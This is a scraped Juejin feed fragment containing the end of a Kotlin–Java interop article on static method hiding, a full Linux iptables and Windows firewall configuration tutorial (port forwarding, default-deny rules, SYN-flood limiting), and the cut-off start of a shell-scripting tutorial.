<li><strong>Java 的视角</strong>：当在 Java 中调用 <code>MyFeatureActivity.launch(...)</code>时，Java 编译器对 <code>companion object</code>一无所知。它只看到 <code>MyFeatureActivity</code>继承自 <code>BaseActivity</code>，并且 <code>BaseActivity</code>中存在一个合法的、公开的 <code>public static void launch(...)</code>方法。于是，遵循继承规则，它直接调用了父类中的静态方法。</li>
</ul>
<p>这就导致了一个极其隐蔽且危险的 Bug：<strong>同一个方法调用，在不同的语言环境中，产生了截然不同的行为！</strong></p>
<h3 data-id="heading-8">最佳实践：放弃执念，拥抱清晰</h3>
<p>面对这种"加上编译不过，不加行为不一"的两难局面，我们应该意识到，"重写"或"隐藏"父类的静态方法从一开始就是一条崎岖的路。</p>
<p><strong>最佳实践只有一个：重命名。</strong></p>
<p>为子类的方法起一个全新的、不会产生任何歧义的名字。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyFeatureActivity</span> : <span class="hljs-type">BaseActivity</span>() {

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-comment">// 使用一个全新的、明确的名字</span>
        <span class="hljs-meta">@JvmStatic</span> <span class="hljs-comment">// 加上 JvmStatic，方便 Java 调用</span>
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">start</span><span class="hljs-params">(context: <span class="hljs-type">Context</span>, specialData: <span class="hljs-type">String</span>)</span></span> {
            <span class="hljs-keyword">val</span> intent = Intent(context, MyFeatureActivity::<span class="hljs-keyword">class</span>.java)
            intent.putExtra(<span class="hljs-string">"SPECIAL_DATA"</span>, specialData)
            <span class="hljs-comment">// 甚至可以复用父类的通用逻辑</span>
            <span class="hljs-comment">// super.launch(context, MyFeatureActivity::class.java) // 错误！不能通过 super 调用 static</span>
            context.startActivity(intent)
        }
    }
}
</code></pre>
<p>这样做的好处显而易见：</p>
<ol>
<li><strong>意图明确</strong>：<code>start</code>这个名字清楚地表明了这是 <code>MyFeatureActivity</code>专属的启动方法。</li>
<li><strong>行为统一</strong>：无论是在 Java 还是 Kotlin 中，调用 <code>MyFeatureActivity.start(...)</code>都只会执行这一个方法，绝无二义。</li>
<li><strong>安全可靠</strong>：彻底根除了因语言差异导致的调用混乱问题。</li>
</ol>
<h3 data-id="heading-9">结语</h3>
<p>这个小小的案例深刻地提醒我们：在享受 Kotlin 与 Java 无缝互操作性的同时，我们必须对其底层的实现差异保持敬畏。试图用一种语言的特性去"强行解释"另一种语言，往往会走进死胡同。</p>
<p>当遇到类似"静态方法继承"这类模糊地带时，选择最清晰、最没有歧义的方案——比如重命名——永远是通往高质量、可维护代码的康庄大道。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[防火墙高级配置完整教程：端口映射+访问控制策略+iptables规则编写]]></title>    <link>https://juejin.cn/post/7576978338754625586</link>    <guid>https://juejin.cn/post/7576978338754625586</guid>    <pubDate>2025-11-27T06:16:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576978338754625586" data-draft-id="7576918517238726706" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="防火墙高级配置完整教程：端口映射+访问控制策略+iptables规则编写"/> <meta itemprop="keywords" content="运维"/> <meta itemprop="datePublished" content="2025-11-27T06:16:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="上班日常摸鱼"/> <meta itemprop="url" content="https://juejin.cn/user/1197792767524060"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            防火墙高级配置完整教程：端口映射+访问控制策略+iptables规则编写
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1197792767524060/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    上班日常摸鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:16:45.000Z" title="Thu Nov 27 2025 06:16:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">一、防火墙高级配置核心概念（新手必看）</h3>
<p>防火墙高级配置是通过精细化规则实现网络流量的精准管控，核心覆盖三大场景：<strong>端口映射</strong>（公网访问内网服务）、<strong>访问控制策略</strong>（IP / 端口 / 协议级权限管控）、<strong>iptables 规则编写</strong>（Linux 系统底层流量过滤）。适用于服务器运维、企业内网安全加固、云服务器端口管理等场景，配置遵循 “最小权限原则”，即仅开放必要服务，拒绝所有默认流量。</p>
<h3 data-id="heading-1">二、端口映射配置（公网访问内网服务实操）</h3>
<p>端口映射本质是将公网 IP 的指定端口流量，转发到内网服务器的私有 IP + 端口，常见于 Web 服务、游戏服务器、远程桌面等场景。</p>
<h4 data-id="heading-2">1. Linux 系统（iptables 实现）</h4>
<h5 data-id="heading-3">前提条件</h5>
<ul>
<li>
<p>已安装 iptables（Debian/Ubuntu：<code>sudo apt install iptables</code>；CentOS：<code>sudo dnf install iptables</code>）</p>
</li>
<li>
<p>拥有公网 IP（服务器网卡绑定公网地址）</p>
</li>
<li>
<p>内网服务器可正常访问</p>
</li>
</ul>
<h5 data-id="heading-4">配置步骤</h5>
<ol>
<li><strong>启用 IP 转发</strong>（内核级转发开关）</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">sudo nano /etc/sysctl.conf
</code></pre>
<p>取消注释或添加：<code>net.ipv4.ip_forward=1</code>，执行生效：</p>
<pre><code class="hljs language-css" lang="css">sudo sysctl -<span class="hljs-selector-tag">p</span>
</code></pre>
<ol>
<li><strong>配置端口转发规则</strong>（示例：公网 8080 端口→内网 192.168.1.100:80）</li>
</ol>
<pre><code class="hljs language-css" lang="css">\# DNAT：目标地址转换（公网→内网）

sudo iptables -t nat -<span class="hljs-selector-tag">A</span> PREROUTING -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">8080</span> -j DNAT <span class="hljs-attr">--to-destination</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span>:<span class="hljs-number">80</span>

\# SNAT：源地址转换（内网→公网，确保返回流量正常）

sudo iptables -t nat -A POSTROUTING -j MASQUERADE
</code></pre>
<ol>
<li><strong>验证与保存</strong></li>
</ol>
<ul>
<li>
<p>查看规则：<code>sudo iptables -t nat -L -n</code></p>
</li>
<li>
<p>永久保存（Ubuntu/Debian）：</p>
</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">sudo apt install iptables-persistent  <span class="hljs-comment"># 安装持久化工具</span>

sudo netfilter-persistent save        <span class="hljs-comment"># 保存规则到/etc/iptables/rules.v4</span>
</code></pre>
<ul>
<li>永久保存（CentOS/RHEL）：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">sudo service iptables save  <span class="hljs-comment"># 规则保存到/etc/sysconfig/iptables</span>
</code></pre>
<h4 data-id="heading-5">2. Windows 系统（Windows Defender 防火墙高级配置）</h4>
<p>适用于 Windows Server 或个人电脑，通过图形化界面配置端口映射：</p>
<ol>
<li>
<p>打开「控制面板→系统和安全→Windows Defender 防火墙→高级设置」</p>
</li>
<li>
<p>右键「入站规则→新建规则」，选择「端口」类型，点击下一步</p>
</li>
<li>
<p>选择 TCP/UDP 协议，输入需映射的本地端口（如 8080），点击下一步</p>
</li>
<li>
<p>选择「允许连接」，配置适用场景（域 / 专用 / 公共网络）</p>
</li>
<li>
<p>命名规则（如 “Web 服务 8080 端口映射”），完成创建</p>
</li>
<li>
<p>补充配置：右键规则→属性→高级，勾选 “在公共网络上启用”（公网访问需开启）</p>
</li>
</ol>
<h3 data-id="heading-6">三、访问控制策略设计与实现</h3>
<p>访问控制策略是防火墙的核心安全机制，通过 “允许 / 拒绝” 规则组合，限制特定 IP、端口或协议的流量，分为入站规则（外部→本地）和出站规则（本地→外部）。</p>
<h4 data-id="heading-7">1. 策略设计三原则</h4>
<ul>
<li>
<p>优先级规则：越具体的规则优先级越高（如 “允许 192.168.1.0/24 访问 80 端口” 优先于 “允许所有 IP 访问 80 端口”）</p>
</li>
<li>
<p>方向区分：入站规则重点防外部攻击，出站规则限制内部违规访问（如禁止访问恶意 IP）</p>
</li>
<li>
<p>日志审计：开启日志记录，便于排查异常流量（记录丢弃包和成功连接）</p>
</li>
</ul>
<h4 data-id="heading-8">2. 实操案例（Linux+Windows）</h4>
<h5 data-id="heading-9">案例 1：Linux iptables 访问控制（最常用）</h5>
<pre><code class="hljs language-css" lang="css">\# <span class="hljs-number">1</span>. 设置默认策略（拒绝所有入站/转发，允许出站）

sudo iptables -<span class="hljs-selector-tag">P</span> <span class="hljs-selector-tag">INPUT</span> DROP

sudo iptables -<span class="hljs-selector-tag">P</span> FORWARD DROP

sudo iptables -<span class="hljs-selector-tag">P</span> OUTPUT ACCEPT

\# <span class="hljs-number">2</span>. 允许信任IP访问SSH（<span class="hljs-number">22</span>端口）

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -s <span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">22</span> -j ACCEPT

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -s <span class="hljs-number">123.45</span>.<span class="hljs-number">67.89</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">22</span> -j ACCEPT

\# <span class="hljs-number">3</span>. 禁止特定IP段访问（如恶意IP段<span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">8</span>）

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -s <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">8</span> -j DROP

\# <span class="hljs-number">4</span>. 允许HTTP（<span class="hljs-number">80</span>）和HTTPS（<span class="hljs-number">443</span>）端口公共访问

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">80</span> -j ACCEPT

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">443</span> -j ACCEPT

\# <span class="hljs-number">5</span>. 启用日志记录（记录被拒绝的连接）

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -j LOG <span class="hljs-attr">--log-prefix</span> "FIREWALL-DENY: <span class="hljs-string">"
</span></code></pre>
<h5 data-id="heading-10">案例 2：Windows Defender 访问控制策略</h5>
<ol>
<li>
<p>打开高级防火墙→「出站规则→新建规则」，选择「自定义」类型</p>
</li>
<li>
<p>匹配条件设置：</p>
</li>
</ol>
<ul>
<li>
<p>协议：TCP/UDP（可指定具体协议号）</p>
</li>
<li>
<p>远程 IP 地址：添加需禁止的 IP 段（如 192.168.2.0/24）</p>
</li>
<li>
<p>本地端口：限制特定端口（如禁止访问 3389 远程桌面端口）</p>
</li>
</ul>
<ol>
<li>
<p>操作选择「阻止连接」，适用网络场景选择「所有网络」</p>
</li>
<li>
<p>命名规则（如 “禁止访问违规 IP 段”），完成配置</p>
</li>
</ol>
<h3 data-id="heading-11">四、iptables 规则编写进阶（Linux 系统）</h3>
<p>iptables 是 Linux 内核自带的防火墙工具，通过 “链 + 规则” 机制过滤流量，核心链包括 INPUT（入站）、OUTPUT（出站）、FORWARD（转发），支持 IP、端口、协议、连接状态等多维度匹配。</p>
<h4 data-id="heading-12">1. 基础语法格式</h4>
<pre><code class="hljs language-css" lang="css">iptables \<span class="hljs-selector-attr">[-t 表名]</span> 动作 链名 匹配条件 -j 目标动作
</code></pre>
<ul>
<li>
<p>表名：默认 filter 表（过滤），nat 表（地址转换），mangle 表（流量修改）</p>
</li>
<li>
<p>动作：-A（追加规则）、-I（插入规则）、-D（删除规则）、-F（清空规则）</p>
</li>
<li>
<p>匹配条件：-s（源 IP）、-d（目标 IP）、-p（协议）、--dport（目标端口）、--sport（源端口）</p>
</li>
<li>
<p>目标动作：ACCEPT（允许）、DROP（丢弃）、REJECT（拒绝并返回信息）、LOG（日志）</p>
</li>
</ul>
<h4 data-id="heading-13">2. 高频规则实例（直接复制可用）</h4>
<h5 data-id="heading-14">（1）连接状态匹配（仅允许已建立的连接）</h5>
<pre><code class="hljs language-css" lang="css">\# 允许ESTABLISHED（已建立）和RELATED（关联连接）流量

sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -m state <span class="hljs-attr">--state</span> ESTABLISHED,RELATED -j ACCEPT
</code></pre>
<h5 data-id="heading-15">（2）端口范围限制（允许 1000-2000 端口访问）</h5>
<pre><code class="hljs language-css" lang="css">sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">1000</span>:<span class="hljs-number">2000</span> -j ACCEPT
</code></pre>
<h5 data-id="heading-16">（3）SYN Flood 攻击防护（限制每秒新建连接数）</h5>
<pre><code class="hljs language-css" lang="css">sudo iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--syn</span> -m limit <span class="hljs-attr">--limit</span> <span class="hljs-number">1</span>/s -j ACCEPT
</code></pre>
<h5 data-id="heading-17">（4）删除指定规则（删除 INPUT 链中允许 80 端口的规则）</h5>
<pre><code class="hljs language-arduino" lang="arduino">\# 先查看规则编号：sudo iptables -L <span class="hljs-literal">INPUT</span> --line-numbers

sudo iptables -D <span class="hljs-literal">INPUT</span> <span class="hljs-number">3</span>  # <span class="hljs-number">3</span>为规则编号
</code></pre>
<h4 data-id="heading-18">3. 规则管理核心技巧</h4>
<ul>
<li>
<p>备份规则：<code>sudo iptables-save &gt; /root/iptables_backup.rules</code></p>
</li>
<li>
<p>恢复规则：<code>sudo iptables-restore &lt; /root/iptables_backup.rules</code></p>
</li>
<li>
<p>开机自启（Systemd 系统）：</p>
</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">\<span class="hljs-comment"># 创建服务文件</span>

sudo nano /etc/systemd/system/iptables-restore.service
</code></pre>
<p>写入以下内容：</p>
<pre><code class="hljs language-ini" lang="ini">\<span class="hljs-section">[Unit]</span>

<span class="hljs-attr">Description</span>=Restore iptables rules

<span class="hljs-attr">After</span>=network.target

\<span class="hljs-section">[Service]</span>

<span class="hljs-attr">Type</span>=<span class="hljs-literal">on</span>eshot

<span class="hljs-attr">ExecStart</span>=/sbin/iptables-restore /etc/iptables/rules.v4

\<span class="hljs-section">[Install]</span>

<span class="hljs-attr">WantedBy</span>=multi-user.target
</code></pre>
<p>启用服务：</p>
<pre><code class="hljs language-bash" lang="bash">sudo systemctl daemon-reload

sudo systemctl <span class="hljs-built_in">enable</span> iptables-restore
</code></pre>
<h3 data-id="heading-19">五、避坑指南与常见问题排查</h3>
<ol>
<li><strong>端口映射配置后无法访问？</strong></li>
</ol>
<ul>
<li>
<p>检查内核 IP 转发是否启用：<code>sysctl net.ipv4.ip_forward</code>（返回 1 为正常）</p>
</li>
<li>
<p>云服务器需开放安全组（如阿里云 ECS、腾讯云需在控制台放行对应端口）</p>
</li>
<li>
<p>本地防火墙是否拦截：<code>sudo iptables -L INPUT -n | grep 8080</code>（查看规则是否存在）</p>
</li>
</ul>
<ol>
<li><strong>iptables 规则重启后失效？</strong></li>
</ol>
<ul>
<li>
<p>未执行永久保存命令（需按 Linux 发行版选择对应方法）</p>
</li>
<li>
<p>CentOS 7 + 默认使用 firewalld，需先关闭：<code>sudo systemctl stop firewalld &amp;&amp; sudo systemctl disable firewalld</code></p>
</li>
</ul>
<ol>
<li><strong>访问控制策略不生效？</strong></li>
</ol>
<ul>
<li>
<p>规则优先级顺序错误：先添加具体规则，再添加通用规则</p>
</li>
<li>
<p>未设置默认拒绝策略：<code>iptables -P INPUT DROP</code>（否则默认允许所有流量）</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Shell脚本基础教程：变量、条件判断、循环、函数实战（附案例）]]></title>    <link>https://juejin.cn/post/7576978338754723890</link>    <guid>https://juejin.cn/post/7576978338754723890</guid>    <pubDate>2025-11-27T06:24:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576978338754723890" data-draft-id="7577016562251808819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Shell脚本基础教程：变量、条件判断、循环、函数实战（附案例）"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-11-27T06:24:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="上班日常摸鱼"/> <meta itemprop="url" content="https://juejin.cn/user/1197792767524060"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Shell脚本基础教程：变量、条件判断、循环、函数实战（附案例）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1197792767524060/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    上班日常摸鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:24:44.000Z" title="Thu Nov 27 2025 06:24:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 